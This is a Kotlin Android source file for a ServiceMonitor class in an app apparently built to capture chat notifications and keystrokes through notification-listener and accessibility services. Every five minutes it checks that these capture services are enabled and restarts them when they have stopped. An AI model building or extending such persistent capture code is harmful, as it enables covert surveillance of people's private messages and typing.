package com.chats.capture.managers

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.provider.Settings
import android.service.notification.NotificationListenerService
import android.text.TextUtils
import com.chats.capture.services.KeyboardCaptureService
import com.chats.capture.services.NotificationCaptureService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import timber.log.Timber

class ServiceMonitor(private val context: Context) {
    
    private val monitorScope = CoroutineScope(Dispatchers.Default)
    
    fun startMonitoring() {
        monitorScope.launch {
            while (true) {
                checkServices()
                delay(5 * 60 * 1000) // Check every 5 minutes
            }
        }
    }
    
    private suspend fun checkServices() {
        // Global kill-switch: if capture is disabled, do not restart/ensure services.
        if (!com.chats.capture.utils.AppStateManager.areServicesEnabled(context)) {
            Timber.tag("SERVICE_MONITOR").d("🛑 Capture disabled - skipping service checks/restarts")
            return
        }

        val notificationServiceEnabled = isNotificationServiceEnabled()
        val keyboardServiceEnabled = isAccessibilityServiceEnabled()
        val notificationServiceRunning = com.chats.capture.utils.ServiceStarter.isNotificationServiceRunning(context)
        
        Timber.tag("SERVICE_MONITOR").d("📊 Service status check - Notification Enabled: $notificationServiceEnabled, Running: $notificationServiceRunning, Keyboard Enabled: $keyboardServiceEnabled")
        
        if (!notificationServiceEnabled) {
            Timber.tag("SERVICE_MONITOR").w("⚠️ Notification service permission is not enabled - Enable in Settings")
        } else if (!notificationServiceRunning) {
            // Service permission is enabled but service is not running - restart it
            Timber.tag("SERVICE_MONITOR").w("⚠️ Notification service is enabled but not running - Restarting...")
            com.chats.capture.utils.ServiceStarter.ensureServicesRunning(context)
        } else {
            Timber.tag("SERVICE_MONITOR").d("✅ Notification service is running normally")
        }
        
        if (!keyboardServiceEnabled) {
            Timber.tag("SERVICE_MONITOR").w("⚠️ Keyboard service (Accessibility) permission is not enabled")
        }
    }
    
    fun isNotificationServiceEnabled(): Boolean {
        val pkgName = context.packageName
        val flat = Settings.Secure.getString(
            context.contentResolver,
            "enabled_notification_listeners"
        )
        if (!TextUtils.isEmpty(flat)) {
            val names = flat.split(":").toTypedArray()
            for (name in names) {
                val componentName = ComponentName.unflattenFromString(name)
                if (componentName != null) {
                    if (TextUtils.equals(pkgName, componentName.packageName)) {
                        return true
                    }
                }
            }
        }
        return false
    }
    
    fun isAccessibilityServiceEnabled(): Boolean {
        val accessibilityServices = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        )
        
        if (accessibilityServices != null) {
            val colonSplitter = TextUtils.SimpleStringSplitter(':')
            colonSplitter.setString(accessibilityServices)
            while (colonSplitter.hasNext()) {
                val accessibilityService = colonSplitter.next()
                if (accessibilityService.contains(context.packageName)) {
                    return true
                }
            }
        }
        return false
    }
    
    fun restartServices() {
        try {
            Timber.tag("SERVICE_MONITOR").i("🔄 Restarting services...")
            // Restart notification service
            val notificationIntent = Intent(context, NotificationCaptureService::class.java)
            context.stopService(notificationIntent)
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                com.chats.capture.utils.ServiceStarter.startNotificationService(context)
            }, 1000) // Small delay before restart
            
            // Restart keyboard service
            val keyboardIntent = Intent(context, KeyboardCaptureService::class.java)
            context.stopService(keyboardIntent)
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    context.startForegroundService(keyboardIntent)
                }, 1500)
            } else {
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    context.startService(keyboardIntent)
                }, 1500)
            }
            
            Timber.tag("SERVICE_MONITOR").i("✅ Services restart initiated")
            Timber.d("Services restarted")
        } catch (e: Exception) {
            Timber.tag("SERVICE_MONITOR").e(e, "❌ Error restarting services")
            Timber.e(e, "Error restarting services")
        }
    }
}
